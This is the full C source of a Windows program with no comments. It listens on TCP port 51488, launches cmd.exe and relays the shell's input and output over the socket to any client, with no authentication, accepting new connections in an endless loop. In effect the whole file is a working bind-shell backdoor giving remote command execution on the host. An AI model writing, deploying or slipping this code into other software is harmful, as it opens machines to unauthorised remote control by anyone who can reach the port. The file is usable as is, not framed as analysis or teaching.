#define WIN32_LEAN_AND_MEAN
#undef UTF8

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define BUFSIZE 512
#define DEFAULT_PORT "51488"
#define EOK 0

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
SOCKET ClientSocket = INVALID_SOCKET;

void CreateChildProcess(void);
void CreatePipes(void);
void CreateSocket(void);
void CloseConnection(void);
void ErrorExit(PTSTR);

DWORD WINAPI WriteToPipe(LPVOID);
DWORD WINAPI ReadFromPipe(LPVOID);

int main(void) {
    for (;;) {
        CreatePipes();
        CreateSocket();
        CreateChildProcess();

        HANDLE threads[2];
        threads[0] = CreateThread(NULL, 0, WriteToPipe, NULL, 0, NULL);
        threads[1] = CreateThread(NULL, 0, ReadFromPipe, NULL, 0, NULL);

        WaitForMultipleObjects(2, threads, TRUE, INFINITE);

        for (int i = 0; i < 2; ++i)
            CloseHandle(threads[i]);

        CloseConnection();
    }
}

void CreateSocket(void) {
    WSADATA wsaData;
    int iResult;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        fprintf(stderr, "WSAStartup failed with error: %d\n", iResult);
        ErrorExit(TEXT("WSAStartup failed"));
    }

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        fprintf(stderr, "getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        ErrorExit(TEXT("getaddrinfo failed"));
    }

    SOCKET ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        fprintf(stderr, "socket failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        ErrorExit(TEXT("socket failed"));
    }

    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        fprintf(stderr, "bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        ErrorExit(TEXT("bind failed"));
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        fprintf(stderr, "listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        ErrorExit(TEXT("listen failed"));
    }

    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        fprintf(stderr, "accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        ErrorExit(TEXT("accept failed"));
    }

    closesocket(ListenSocket);
}

void CloseConnection(void) {
    int iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        fprintf(stderr, "shutdown failed with error: %d\n", WSAGetLastError());
    }

    closesocket(ClientSocket);
    WSACleanup();
}

void CreatePipes(void) {
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0) ||
        !SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
        ErrorExit(TEXT("StdoutRd CreatePipe"));
    }

    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0) ||
        !SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
        ErrorExit(TEXT("Stdin CreatePipe"));
    }
}

void CreateChildProcess(void) {
    TCHAR szCmdline[] = TEXT("C:\\Windows\\System32\\cmd.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    if (!CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        ErrorExit(TEXT("CreateProcess"));
    } else {
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
}

DWORD WINAPI WriteToPipe(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);
    DWORD dwWritten, iResult;
    CHAR chBuf[BUFSIZE];

    for (;;) {
        iResult = recv(ClientSocket, chBuf, BUFSIZE, 0);
        if (iResult <= 0) {
            return EOK;
        }

        if (!WriteFile(g_hChildStd_IN_Wr, chBuf, iResult, &dwWritten, NULL) || dwWritten == 0) {
            return EOK;
        }
    }

    return EOK;
}

DWORD WINAPI ReadFromPipe(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);
    DWORD dwRead, iSendResult;
    CHAR chBuf[BUFSIZE + 1];

    for (;;) {
        if (!ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL)) {
            return EOK;
        }

        chBuf[dwRead] = '\0';

        iSendResult = send(ClientSocket, chBuf, dwRead, 0);
        if (iSendResult == SOCKET_ERROR) {
            return EOK;
        }
    }

    return EOK;
}

void ErrorExit(PTSTR lpszFunction) {
    DWORD dw = GetLastError();
    printf("%s failed with error %d\n", lpszFunction, dw);
    ExitProcess(1);
}
